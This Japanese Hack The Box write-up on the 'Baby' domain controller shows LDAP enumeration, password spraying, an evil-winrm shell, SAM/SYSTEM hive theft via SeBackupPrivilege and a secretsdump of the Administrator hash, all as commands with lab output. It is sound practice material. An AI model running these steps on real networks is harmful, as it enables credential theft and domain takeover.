@@ -1,0 +1,978 @@
+---
+title: "[HTB Writeup] Baby"
+description: "Hack The Box の Baby の Writeup です。"
+tags: ["security", "ctf", "htb", "writeup"]
+pubDate: '2026-03-04'
+htbStatus: 'retired'
+htbDifficulty: 'easy'
+htbMachineImage: './images/htb-baby.png'
+---
+
+> [!caution]
+> この記事は合法的なペネトレーションテスト環境（Hack The Box）での攻略内容です。許可のないシステムへの攻撃は違法です。
+
+## Overview
+
+Baby は Windows の Active Directory Domain Controller マシンです。
+
+- **OS**: Windows Server 2022
+- **Difficulty**: Easy
+- **Key Topics**: LDAP Anonymous Bind, Password Spraying, SeBackupPrivilege, NTDS.dit Dump, Pass the Hash
+
+## Enumeration
+
+### Nmap
+
+まずは全ポートスキャンでAttack Surfaceを把握します。
+
+```bash
+┌──(kali㉿kali)-[~/htb/baby.htb]
+└─$ nmap -Pn -p- --min-rate=3000 -T4 -oA nmap/allports 10.129.234.71
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-04 02:40 -0500
+Nmap scan report for 10.129.234.71
+Host is up (0.11s latency).
+Not shown: 65514 filtered tcp ports (no-response)
+PORT      STATE SERVICE
+53/tcp    open  domain
+88/tcp    open  kerberos-sec
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+389/tcp   open  ldap
+445/tcp   open  microsoft-ds
+464/tcp   open  kpasswd5
+593/tcp   open  http-rpc-epmap
+636/tcp   open  ldapssl
+3268/tcp  open  globalcatLDAP
+3269/tcp  open  globalcatLDAPssl
+3389/tcp  open  ms-wbt-server
+5985/tcp  open  wsman
+9389/tcp  open  adws
+49664/tcp open  unknown
+49669/tcp open  unknown
+53871/tcp open  unknown
+53888/tcp open  unknown
+58250/tcp open  unknown
+58251/tcp open  unknown
+58259/tcp open  unknown
+
+Nmap done: 1 IP address (1 host up) scanned in 44.59 seconds
+
+```
+いくつか開いているポートが確認できたので、ポート番号を抽出して、詳細スキャンを実行します。
+
+```bash
+┌──(kali㉿kali)-[~/htb/baby.htb]
+└─$ grep -oP '\d+/open' nmap/allports.gnmap | cut -d '/' -f 1 | tr '\n' ','               
+53,88,135,139,389,445,464,593,636,3268,3269,3389,5985,9389,49664,49669,53871,53888,58250,58251,58259,                                                                                                                                                                                                                                          
+┌──(kali㉿kali)-[~/htb/baby.htb]
+└─$ nmap -Pn -p53,88,135,139,389,445,464,593,636,3268,3269,3389,5985,9389,49664,49669,53871,53888,58250,5
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-04 02:42 -0500
+Nmap scan report for 10.129.234.71
+Host is up (0.18s latency).
+
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Simple DNS Plus
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-03-04 07:42:17Z)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: baby.vl, Site: Default-Fir
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: baby.vl, Site: Default-Fir
+3269/tcp  open  tcpwrapped
+3389/tcp  open  ms-wbt-server Microsoft Terminal Services
+|_ssl-date: 2026-03-04T07:43:49+00:00; 0s from scanner time.
+| rdp-ntlm-info: 
+|   Target_Name: BABY
+|   NetBIOS_Domain_Name: BABY
+|   NetBIOS_Computer_Name: BABYDC
+|   DNS_Domain_Name: baby.vl
+|   DNS_Computer_Name: BabyDC.baby.vl
+|   DNS_Tree_Name: baby.vl
+|   Product_Version: 10.0.20348
+|_  System_Time: 2026-03-04T07:43:10+00:00
+| ssl-cert: Subject: commonName=BabyDC.baby.vl
+| Not valid before: 2026-03-03T07:38:08
+|_Not valid after:  2026-09-02T07:38:08
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+9389/tcp  open  mc-nmf        .NET Message Framing
+49664/tcp open  msrpc         Microsoft Windows RPC
+49669/tcp open  msrpc         Microsoft Windows RPC
+53871/tcp open  msrpc         Microsoft Windows RPC
+53888/tcp open  msrpc         Microsoft Windows RPC
+58250/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+58251/tcp open  msrpc         Microsoft Windows RPC
+58259/tcp open  msrpc         Microsoft Windows RPC
+Service Info: Host: BABYDC; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode: 
+|   3.1.1: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   date: 2026-03-04T07:43:11
+|_  start_date: N/A
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 107.06 seconds
+ 
+```
+Active Directoryのドメインコントローラーですね。
+ドメイン名が `baby.vl` で、コンピュータ名が `BabyDC.baby.vl` であることがわかります。
+これを `/etc/hosts` に追加しておきます。
+
+```bash
+┌──(kali㉿kali)-[~/htb/baby.htb]
+└─$ echo "10.129.234.71 baby.vl BabyDC.baby.vl" | sudo tee -a /etc/hosts
+[sudo] password for kali: 
+10.129.234.71 baby.vl BabyDC.baby.vl
+```
+
+Attack Surfaceの分析として、
+- LDAP (389/tcp, 3268/tcp): 匿名バインドが可能かを確認するべき
+- SMB (445/tcp): `Message signing enabled and required` とあるので、Relayは厳しそう
+- Kerberos (88/tcp): AS-REP Roasting や Kerberoasting の可能性もある
+- WinRM (5985/tcp): 認証情報があればEvil-WinRMでシェルが取れるかも
+- RDP (3389/tcp): 認証情報があればリモートデスクトップでアクセスできるかも
+
+といった感じで、結構攻撃の選択肢が多そうです。
+まずはLDAPの匿名バインドを試してみます。
+LDAPに関するチートシートは、こちらが有用です。
+[Pentesting LDAP](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-ldap.html)
+
+```bash
+┌──(kali㉿kali)-[~/htb/baby.htb]
+└─$ ldapsearch -x -H ldap://baby.vl -s base -b '' "(objectClass=*)" "*" +
+# extended LDIF
+#
+# LDAPv3
+# base <> with scope baseObject
+# filter: (objectClass=*)
+# requesting: * + 
+#
+
+#
+dn:
+domainFunctionality: 7
+forestFunctionality: 7
+domainControllerFunctionality: 7
+rootDomainNamingContext: DC=baby,DC=vl
+ldapServiceName: baby.vl:babydc$@BABY.VL
+isGlobalCatalogReady: TRUE
+supportedSASLMechanisms: GSSAPI
+supportedSASLMechanisms: GSS-SPNEGO
+supportedSASLMechanisms: EXTERNAL
+supportedSASLMechanisms: DIGEST-MD5
+supportedLDAPVersion: 3
+supportedLDAPVersion: 2
+supportedLDAPPolicies: MaxPoolThreads
+supportedLDAPPolicies: MaxPercentDirSyncRequests
+supportedLDAPPolicies: MaxDatagramRecv
+supportedLDAPPolicies: MaxReceiveBuffer
+supportedLDAPPolicies: MaxPreAuthReceiveBuffer
+supportedLDAPPolicies: InitRecvTimeout
+supportedLDAPPolicies: MaxConnections
+supportedLDAPPolicies: MaxConnIdleTime
+supportedLDAPPolicies: MaxPageSize
+supportedLDAPPolicies: MaxBatchReturnMessages
+supportedLDAPPolicies: MaxQueryDuration
+supportedLDAPPolicies: MaxDirSyncDuration
+supportedLDAPPolicies: MaxTempTableSize
+supportedLDAPPolicies: MaxResultSetSize
+supportedLDAPPolicies: MinResultSets
+supportedLDAPPolicies: MaxResultSetsPerConn
+supportedLDAPPolicies: MaxNotificationPerConn
+supportedLDAPPolicies: MaxValRange
+supportedLDAPPolicies: MaxValRangeTransitive
+supportedLDAPPolicies: ThreadMemoryLimit
+supportedLDAPPolicies: SystemMemoryLimitPercent
+supportedControl: 1.2.840.113556.1.4.319
+supportedControl: 1.2.840.113556.1.4.801
+supportedControl: 1.2.840.113556.1.4.473
+supportedControl: 1.2.840.113556.1.4.528
+supportedControl: 1.2.840.113556.1.4.417
+supportedControl: 1.2.840.113556.1.4.619
+supportedControl: 1.2.840.113556.1.4.841
+supportedControl: 1.2.840.113556.1.4.529
+supportedControl: 1.2.840.113556.1.4.805
+supportedControl: 1.2.840.113556.1.4.521
+supportedControl: 1.2.840.113556.1.4.970
+supportedControl: 1.2.840.113556.1.4.1338
+supportedControl: 1.2.840.113556.1.4.474
+supportedControl: 1.2.840.113556.1.4.1339
+supportedControl: 1.2.840.113556.1.4.1340
+supportedControl: 1.2.840.113556.1.4.1413
+supportedControl: 2.16.840.1.113730.3.4.9
+supportedControl: 2.16.840.1.113730.3.4.10
+supportedControl: 1.2.840.113556.1.4.1504
+supportedControl: 1.2.840.113556.1.4.1852
+supportedControl: 1.2.840.113556.1.4.802
+supportedControl: 1.2.840.113556.1.4.1907
+supportedControl: 1.2.840.113556.1.4.1948
+supportedControl: 1.2.840.113556.1.4.1974
+supportedControl: 1.2.840.113556.1.4.1341
+supportedControl: 1.2.840.113556.1.4.2026
+supportedControl: 1.2.840.113556.1.4.2064
+supportedControl: 1.2.840.113556.1.4.2065
+supportedControl: 1.2.840.113556.1.4.2066
+supportedControl: 1.2.840.113556.1.4.2090
+supportedControl: 1.2.840.113556.1.4.2205
+supportedControl: 1.2.840.113556.1.4.2204
+supportedControl: 1.2.840.113556.1.4.2206
+supportedControl: 1.2.840.113556.1.4.2211
+supportedControl: 1.2.840.113556.1.4.2239
+supportedControl: 1.2.840.113556.1.4.2255
+supportedControl: 1.2.840.113556.1.4.2256
+supportedControl: 1.2.840.113556.1.4.2309
+supportedControl: 1.2.840.113556.1.4.2330
+supportedControl: 1.2.840.113556.1.4.2354
+supportedCapabilities: 1.2.840.113556.1.4.800
+supportedCapabilities: 1.2.840.113556.1.4.1670
+supportedCapabilities: 1.2.840.113556.1.4.1791
+supportedCapabilities: 1.2.840.113556.1.4.1935
+supportedCapabilities: 1.2.840.113556.1.4.2080
+supportedCapabilities: 1.2.840.113556.1.4.2237
+subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=baby,DC=vl
+serverName: CN=BABYDC,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Config
+ uration,DC=baby,DC=vl
+schemaNamingContext: CN=Schema,CN=Configuration,DC=baby,DC=vl
+namingContexts: DC=baby,DC=vl
+namingContexts: CN=Configuration,DC=baby,DC=vl
+namingContexts: CN=Schema,CN=Configuration,DC=baby,DC=vl
+namingContexts: DC=DomainDnsZones,DC=baby,DC=vl
+namingContexts: DC=ForestDnsZones,DC=baby,DC=vl
+isSynchronized: TRUE
+highestCommittedUSN: 118882
+dsServiceName: CN=NTDS Settings,CN=BABYDC,CN=Servers,CN=Default-First-Site-Nam
+ e,CN=Sites,CN=Configuration,DC=baby,DC=vl
+dnsHostName: BabyDC.baby.vl
+defaultNamingContext: DC=baby,DC=vl
+currentTime: 20260304083206.0Z
+configurationNamingContext: CN=Configuration,DC=baby,DC=vl
+
+# search result
+search: 2
+result: 0 Success
+
+# numResponses: 2
+# numEntries: 1
+```
+
+`defaultNamingContext: DC=baby,DC=vl` や `namingContexts: DC=baby,DC=vl` から、LDAPのベースDNは `DC=baby,DC=vl` であることがわかります。
+
+次に、ユーザーオブジェクトを検索してみます。
+
+```bash
+┌──(kali㉿kali)-[~/htb/baby.htb]
+└─$ ldapsearch -x -H ldap://baby.vl -b "DC=baby,DC=vl" "(&(objectClass=user)(objectCategory=person))" sAMAccountName description memberOf  
+# extended LDIF
+#
+# LDAPv3
+# base <DC=baby,DC=vl> with scope subtree
+# filter: (&(objectClass=user)(objectCategory=person))
+# requesting: sAMAccountName description memberOf 
+#
+
+# Guest, Users, baby.vl
+dn: CN=Guest,CN=Users,DC=baby,DC=vl
+description: Built-in account for guest access to the computer/domain
+memberOf: CN=Guests,CN=Builtin,DC=baby,DC=vl
+sAMAccountName: Guest
+
+# Jacqueline Barnett, dev, baby.vl
+dn: CN=Jacqueline Barnett,OU=dev,DC=baby,DC=vl
+memberOf: CN=dev,CN=Users,DC=baby,DC=vl
+sAMAccountName: Jacqueline.Barnett
+
+# Ashley Webb, dev, baby.vl
+dn: CN=Ashley Webb,OU=dev,DC=baby,DC=vl
+memberOf: CN=dev,CN=Users,DC=baby,DC=vl
+sAMAccountName: Ashley.Webb
+
+# Hugh George, dev, baby.vl
+dn: CN=Hugh George,OU=dev,DC=baby,DC=vl
+memberOf: CN=dev,CN=Users,DC=baby,DC=vl
+sAMAccountName: Hugh.George
+
+# Leonard Dyer, dev, baby.vl
+dn: CN=Leonard Dyer,OU=dev,DC=baby,DC=vl
+memberOf: CN=dev,CN=Users,DC=baby,DC=vl
+sAMAccountName: Leonard.Dyer
+
+# Connor Wilkinson, it, baby.vl
+dn: CN=Connor Wilkinson,OU=it,DC=baby,DC=vl
+memberOf: CN=it,CN=Users,DC=baby,DC=vl
+sAMAccountName: Connor.Wilkinson
+
+# Joseph Hughes, it, baby.vl
+dn: CN=Joseph Hughes,OU=it,DC=baby,DC=vl
+memberOf: CN=it,CN=Users,DC=baby,DC=vl
+sAMAccountName: Joseph.Hughes
+
+# Kerry Wilson, it, baby.vl
+dn: CN=Kerry Wilson,OU=it,DC=baby,DC=vl
+memberOf: CN=it,CN=Users,DC=baby,DC=vl
+sAMAccountName: Kerry.Wilson
+
+# Teresa Bell, it, baby.vl
+dn: CN=Teresa Bell,OU=it,DC=baby,DC=vl
+description: Set initial password to BabyStart123!
+memberOf: CN=it,CN=Users,DC=baby,DC=vl
+sAMAccountName: Teresa.Bell
+
+# search reference
+ref: ldap://ForestDnsZones.baby.vl/DC=ForestDnsZones,DC=baby,DC=vl
+
+# search reference
+ref: ldap://DomainDnsZones.baby.vl/DC=DomainDnsZones,DC=baby,DC=vl
+
+# search reference
+ref: ldap://baby.vl/CN=Configuration,DC=baby,DC=vl
+
+# search result
+search: 2
+result: 0 Success
+
+# numResponses: 13
+# numEntries: 9
+# numReferences: 3
+```
+
+匿名バインドは成功しており、ユーザーオブジェクトの情報を取得できました。
+
+以下がユーザ情報のまとめです。
+| sAMAccountName       | description                        | memberOf              |
+|----------------------|------------------------------------|-----------------------|
+| Guest                | Built-in account for guest access to the computer/domain | CN=Guests,CN=Builtin,DC=baby,DC=vl |
+| Jacqueline.Barnett   |                                    | CN=dev,CN=Users,DC=baby,DC=vl |
+| Ashley.Webb         |                                    | CN=dev,CN=Users,DC=baby,DC=vl |
+| Hugh.George         |                                    | CN=dev,CN=Users,DC=baby,DC=vl |
+| Leonard.Dyer        |                                    | CN=dev,CN=Users,DC=baby,DC=vl |
+| Connor.Wilkinson    |                                    | CN=it,CN=Users,DC=baby,DC=vl |
+| Joseph.Hughes       |                                    | CN=it,CN=Users,DC=baby,DC=vl |
+| Kerry.Wilson        |                                    | CN=it,CN=Users,DC=baby,DC=vl |
+| Teresa.Bell         | Set initial password to BabyStart123! | CN=it,CN=Users,DC=baby,DC=vl | 
+
+また、重要な情報として、`Teresa Bell` というユーザーの `description` 属性に、初期パスワードと思われる `BabyStart123!` が記載されていることがわかります。
+
+一旦、列挙できたユーザーを `users.txt` に保存しておきます。
+また、初期パスワードと思われる `BabyStart123!` を `initial_password.txt` に保存しておきます。
+
+```bash
+┌──(kali㉿kali)-[~/htb/baby.htb]
+└─$ ldapsearch -x -H ldap://baby.vl -b "DC=baby,DC=vl" "(&(objectClass=user)(objectCategory=person))" sAMAccountName | grep sAMAccountName | grep -v requesting | cut -d " " -f2 > users.txt
+                                                                                                         
+┌──(kali㉿kali)-[~/htb/baby.htb]
+└─$ cat users.txt 
+Guest
+Jacqueline.Barnett
+Ashley.Webb
+Hugh.George
+Leonard.Dyer
+Connor.Wilkinson
+Joseph.Hughes
+Kerry.Wilson
+Teresa.Bell
+                                                                                                         
+┌──(kali㉿kali)-[~/htb/baby.htb]
+└─$ cat > initial_password.txt
+BabyStart123!
+[Ctrl+D]
+```
+
+
+初期パスワードのまま変更していないユーザーがいる可能性があるので、Password Spraying を試してみます。
+
+```bash
+┌──(kali㉿kali)-[~/htb/baby.htb]
+└─$ ldapsearch -x -H ldap://baby.vl -b "DC=baby,DC=vl" "(&(objectClass=user)(objectCategory=person))" sAMAccountName | grep sAMAccountName | grep -v requesting | cut -d " " -f2 > users.txt
+                                                                                                         
+┌──(kali㉿kali)-[~/htb/baby.htb]
+└─$ cat users.txt 
+Guest
+Jacqueline.Barnett
+Ashley.Webb
+Hugh.George
+Leonard.Dyer
+Connor.Wilkinson
+Joseph.Hughes
+Kerry.Wilson
+Teresa.Bell
+                                                                                                         
+┌──(kali㉿kali)-[~/htb/baby.htb]
+└─$ cat > initial_password.txt
+BabyStart123!
+                                                                                                         
+┌──(kali㉿kali)-[~/htb/baby.htb]
+└─$ nxc ldap baby.vl -u users.txt -p $(cat initial_password.txt) 
+LDAP        10.129.234.71   389    BABYDC           [*] Windows Server 2022 Build 20348 (name:BABYDC) (domain:baby.vl) (signing:None) (channel binding:No TLS cert)
+LDAP        10.129.234.71   389    BABYDC           [-] baby.vl\Guest:BabyStart123! 
+LDAP        10.129.234.71   389    BABYDC           [-] baby.vl\Jacqueline.Barnett:BabyStart123! 
+LDAP        10.129.234.71   389    BABYDC           [-] baby.vl\Ashley.Webb:BabyStart123! 
+LDAP        10.129.234.71   389    BABYDC           [-] baby.vl\Hugh.George:BabyStart123! 
+LDAP        10.129.234.71   389    BABYDC           [-] baby.vl\Leonard.Dyer:BabyStart123! 
+LDAP        10.129.234.71   389    BABYDC           [-] baby.vl\Connor.Wilkinson:BabyStart123! 
+LDAP        10.129.234.71   389    BABYDC           [-] baby.vl\Joseph.Hughes:BabyStart123! 
+LDAP        10.129.234.71   389    BABYDC           [-] baby.vl\Kerry.Wilson:BabyStart123! 
+LDAP        10.129.234.71   389    BABYDC           [-] baby.vl\Teresa.Bell:BabyStart123! 
+                                                                                                         
+```
+残念ながら、全てのユーザーで初期パスワードが変更されているようです。
+
+もう少しLDAPを深堀ってみます。
+先程のフィルターだと、Administratorユーザーが見つからなかったのが気になります。
+一旦、オブジェクトを全列挙して、dnを確認してみます。
+
+```bash
+┌──(kali㉿kali)-[~/htb/baby.htb]
+└─$ ldapsearch -x -H ldap://baby.vl -b "DC=baby,DC=vl" "*" dn | grep dn
+# requesting: * dn 
+dn: DC=baby,DC=vl
+dn: CN=Administrator,CN=Users,DC=baby,DC=vl
+dn: CN=Guest,CN=Users,DC=baby,DC=vl
+dn: CN=krbtgt,CN=Users,DC=baby,DC=vl
+dn: CN=Domain Computers,CN=Users,DC=baby,DC=vl
+dn: CN=Domain Controllers,CN=Users,DC=baby,DC=vl
+dn: CN=Schema Admins,CN=Users,DC=baby,DC=vl
+dn: CN=Enterprise Admins,CN=Users,DC=baby,DC=vl
+dn: CN=Cert Publishers,CN=Users,DC=baby,DC=vl
+dn: CN=Domain Admins,CN=Users,DC=baby,DC=vl
+dn: CN=Domain Users,CN=Users,DC=baby,DC=vl
+dn: CN=Domain Guests,CN=Users,DC=baby,DC=vl
+dn: CN=Group Policy Creator Owners,CN=Users,DC=baby,DC=vl
+dn: CN=RAS and IAS Servers,CN=Users,DC=baby,DC=vl
+dn: CN=Allowed RODC Password Replication Group,CN=Users,DC=baby,DC=vl
+dn: CN=Denied RODC Password Replication Group,CN=Users,DC=baby,DC=vl
+dn: CN=Read-only Domain Controllers,CN=Users,DC=baby,DC=vl
+dn: CN=Enterprise Read-only Domain Controllers,CN=Users,DC=baby,DC=vl
+dn: CN=Cloneable Domain Controllers,CN=Users,DC=baby,DC=vl
+dn: CN=Protected Users,CN=Users,DC=baby,DC=vl
+dn: CN=Key Admins,CN=Users,DC=baby,DC=vl
+dn: CN=Enterprise Key Admins,CN=Users,DC=baby,DC=vl
+dn: CN=DnsAdmins,CN=Users,DC=baby,DC=vl
+dn: CN=DnsUpdateProxy,CN=Users,DC=baby,DC=vl
+dn: CN=dev,CN=Users,DC=baby,DC=vl
+dn: CN=Jacqueline Barnett,OU=dev,DC=baby,DC=vl
+dn: CN=Ashley Webb,OU=dev,DC=baby,DC=vl
+dn: CN=Hugh George,OU=dev,DC=baby,DC=vl
+dn: CN=Leonard Dyer,OU=dev,DC=baby,DC=vl
+dn: CN=Ian Walker,OU=dev,DC=baby,DC=vl
+dn: CN=it,CN=Users,DC=baby,DC=vl
+dn: CN=Connor Wilkinson,OU=it,DC=baby,DC=vl
+dn: CN=Joseph Hughes,OU=it,DC=baby,DC=vl
+dn: CN=Kerry Wilson,OU=it,DC=baby,DC=vl
+dn: CN=Teresa Bell,OU=it,DC=baby,DC=vl
+dn: CN=Caroline Robinson,OU=it,DC=baby,DC=vl
+
+```
+Administratorユーザーは `CN=Administrator,CN=Users,DC=baby,DC=vl` に存在していることがわかります。
+また、`CN=Ian Walker,OU=dev,DC=baby,DC=vl` と `CN=Caroline Robinson,OU=it,DC=baby,DC=vl` というユーザーも見つかりました。
+これらのユーザーも含めて、再度Password Sprayingを試してみます。
+
+```bash
+┌──(kali㉿kali)-[~/htb/baby.htb]
+└─$ echo -e "Ian.Walker\nCaroline.Robinson\nAdministrator" >> users.txt
+                                                                                                         
+┌──(kali㉿kali)-[~/htb/baby.htb]
+└─$ cat users.txt             
+Guest
+Jacqueline.Barnett
+Ashley.Webb
+Hugh.George
+Leonard.Dyer
+Connor.Wilkinson
+Joseph.Hughes
+Kerry.Wilson
+Teresa.Bell
+Ian.Walker
+Caroline.Robinson
+Administrator
+                                                                                                         
+┌──(kali㉿kali)-[~/htb/baby.htb]
+└─$ nxc ldap baby.vl -u users.txt -p $(cat initial_password.txt)
+LDAP        10.129.234.71   389    BABYDC           [*] Windows Server 2022 Build 20348 (name:BABYDC) (domain:baby.vl) (signing:None) (channel binding:No TLS cert)
+LDAP        10.129.234.71   389    BABYDC           [-] baby.vl\Guest:BabyStart123! 
+LDAP        10.129.234.71   389    BABYDC           [-] baby.vl\Jacqueline.Barnett:BabyStart123! 
+LDAP        10.129.234.71   389    BABYDC           [-] baby.vl\Ashley.Webb:BabyStart123! 
+LDAP        10.129.234.71   389    BABYDC           [-] baby.vl\Hugh.George:BabyStart123! 
+LDAP        10.129.234.71   389    BABYDC           [-] baby.vl\Leonard.Dyer:BabyStart123! 
+LDAP        10.129.234.71   389    BABYDC           [-] baby.vl\Connor.Wilkinson:BabyStart123! 
+LDAP        10.129.234.71   389    BABYDC           [-] baby.vl\Joseph.Hughes:BabyStart123! 
+LDAP        10.129.234.71   389    BABYDC           [-] baby.vl\Kerry.Wilson:BabyStart123! 
+LDAP        10.129.234.71   389    BABYDC           [-] baby.vl\Teresa.Bell:BabyStart123! 
+LDAP        10.129.234.71   389    BABYDC           [-] baby.vl\Ian.Walker:BabyStart123! 
+LDAP        10.129.234.71   389    BABYDC           [-] baby.vl\Caroline.Robinson:BabyStart123! STATUS_PASSWORD_MUST_CHANGE
+LDAP        10.129.234.71   389    BABYDC           [-] baby.vl\Administrator:BabyStart123! 
+
+```
+`Caroline.Robinson` ユーザーは、初期パスワードが設定されているものの、パスワード変更が必要な状態であることがわかります。
+
+## Initial Foothold
+
+`smbpasswd` でパスワードを変更します。
+
+```bash
+┌──(kali㉿kali)-[~/htb/baby.htb]
+└─$ smbpasswd -r baby.vl -U baby.vl/Caroline.Robinson
+Old SMB password: # BabyStart123!
+New SMB password: # NewPassword123!
+Retype new SMB password: # NewPassword123!
+Password changed for user Caroline.Robinson
+```
+
+うまくパスワードを変更できたので、NetExecを使って、WinRMでシェルが取れるか試してみます。
+
+```bash
+┌──(kali㉿kali)-[~/htb/baby.htb]
+└─$ nxc winrm baby.vl -u 'Caroline.Robinson' -p 'NewPassword123!'
+WINRM       10.129.234.71   5985   BABYDC           [*] Windows Server 2022 Build 20348 (name:BABYDC) (domain:baby.vl)
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+WINRM       10.129.234.71   5985   BABYDC           [+] baby.vl\Caroline.Robinson:NewPassword123! (Pwn3d!)  
+```
+
+`(Pwn3d!)` と表示されている!!
+
+Evil-WinRMでシェルを取ってみます。
+
+```bash
+┌──(kali㉿kali)-[~/htb/baby.htb]
+└─$ evil-winrm -i baby.vl -u 'Caroline.Robinson' -p 'NewPassword123!'
+                                        
+Evil-WinRM shell v3.9
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline                                                                                  
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                                             
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents> 
+```
+
+これでシェルが取れたので、user.txt を取得しました。
+```bash
+*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents> type ../Desktop/user.txt
+114db976899df1f9c038095e17fbf975
+```
+
+## Privilege Escalation
+
+次は、root.txt を目指して、権限昇格の方法を模索します。
+
+まずは、現在の権限を確認します。
+```bash
+*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents> whoami /all
+
+USER INFORMATION
+----------------
+
+User Name              SID
+====================== ==============================================
+baby\caroline.robinson S-1-5-21-1407081343-4001094062-1444647654-1115
+
+
+GROUP INFORMATION
+-----------------
+
+Group Name                                 Type             SID                                            Attributes
+========================================== ================ ============================================== ==================================================
+Everyone                                   Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
+BUILTIN\Backup Operators                   Alias            S-1-5-32-551                                   Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                              Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
+BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
+BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                   Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization             Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
+BABY\it                                    Group            S-1-5-21-1407081343-4001094062-1444647654-1109 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
+Mandatory Label\High Mandatory Level       Label            S-1-16-12288
+
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State
+============================= ============================== =======
+SeMachineAccountPrivilege     Add workstations to domain     Enabled
+SeBackupPrivilege             Back up files and directories  Enabled
+SeRestorePrivilege            Restore files and directories  Enabled
+SeShutdownPrivilege           Shut down the system           Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+
+
+USER CLAIMS INFORMATION
+-----------------------
+
+User claims unknown.
+
+Kerberos support for Dynamic Access Control on this device has been disabled.
+```
+
+Caroline.Robinsonユーザーは、`Backup Operators` グループのメンバーであることがわかります。
+また、`SeBackupPrivilege` と `SeRestorePrivilege` という特権が有効になっています。
+これらの特権を利用して、権限昇格ができないか調査します。
+
+検索すると以下のGitHubリポジトリのページが見つかりました。
+[SeBackupPrivilege](https://github.com/nickvourd/Windows-Local-Privilege-Escalation-Cookbook/blob/master/Notes/SeBackupPrivilege.md)
+
+このページによると、`SeBackupPrivilege` を利用して、バックアップモードでファイルをコピーすることで、任意のファイルを読み取ることができるようです。
+ここでは、`sam.hive` と `system.hive` をコピーして、ローカルでHashを解析する方法が紹介されていました。
+
+samファイルにはローカルにキャッシュされた認証情報が保存されており、systemファイルには、認証情報を解析するために必要なキーが保存されているようです。
+参考: [SAM & LSA secrets](https://www.thehacker.recipes/ad/movement/credentials/dumping/sam-and-lsa-secrets)
+
+[SeBackupPrivilege - Exploitation](https://github.com/nickvourd/Windows-Local-Privilege-Escalation-Cookbook/blob/master/Notes/SeBackupPrivilege.md#exploitation) に乗っていたコマンドに従い、
+AdministratorのHashを取得してみます。
+
+```bash
+*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents> reg save hklm\sam sam.hive
+The operation completed successfully.
+
+*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents> reg save hklm\system system.hive
+The operation completed successfully.
+
+```
+
+`sam.hive` と `system.hive` を取得して、ローカルでHashを解析します。
+
+```bash
+*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents> download sam.hive
+                                        
+Info: Downloading C:\Users\Caroline.Robinson\Documents\sam.hive to sam.hive
+                                        
+Info: Download successful!
+*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents> download system.hive
+                                        
+Info: Downloading C:\Users\Caroline.Robinson\Documents\system.hive to system.hive
+                                        
+Info: Download successful!
+```
+
+Hash解析には、`impacket-secretsdump` を利用します。
+`-sam` オプションでsamファイルを指定し、`-system` オプションでsystemファイルを指定します。
+参考: [Secrets Dump](https://www.thehacker.recipes/ad/movement/credentials/dumping/sam-and-lsa-secrets#secrets-dump)
+
+```bash
+┌──(kali㉿kali)-[~/htb/baby.htb]
+└─$ impacket-secretsdump -sam sam.hive -system system.hive LOCAL
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Target system bootKey: 0x191d5d3fd5b0b51888453de8541d7e88
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:8d992faed38128ae85e95fa35868bb43:::
